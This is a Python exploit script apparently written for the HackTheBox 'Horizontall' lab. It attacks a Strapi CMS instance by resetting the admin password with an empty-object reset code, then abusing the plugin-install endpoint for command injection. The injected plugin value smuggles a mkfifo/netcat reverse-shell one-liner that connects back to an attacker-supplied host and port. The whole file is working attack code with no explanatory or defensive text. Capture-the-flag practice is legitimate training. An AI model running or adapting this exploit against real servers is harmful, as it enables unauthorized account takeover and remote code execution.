import json
import requests
import sys


if len(sys.argv) != 3:
    print(f'Usage: {sys.argv[0]} <lhost> <lport>')
    sys.exit(1)


lhost, lport = sys.argv[1:3]
url = 'http://api-prod.horizontall.htb'
email = 'admin@horizontall.htb'
new_password = 'asdfasdfasdf'


def main():
    s = requests.session()

    version = json.loads(
        s.get(f'{url}/admin/strapiVersion').text)['strapiVersion']

    print(f'[*] Detected version (GET /admin/strapiVersion): {version}')
    print('[*] Sending password reset request...')

    s.post(f'{url}', json={
        'email': email,
        'url': f'{url}/admin/plugins/users-permissions/auth/reset-password'
    })

    print('[*] Setting new password...')

    r = s.post(f'{url}/admin/auth/reset-password', json={
        'code': {}, 'password': new_password, 'passwordConfirmation': new_password
    })

    print('[*] Response:', r.text)

    token = r.json()['jwt']
    command = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f'

    s.post(f'{url}/admin/plugins/install',
           headers={'Authorization': f'Bearer {token}'},
           data={'plugin': f'documentation && $({command})'})


if __name__ == '__main__':
    main()
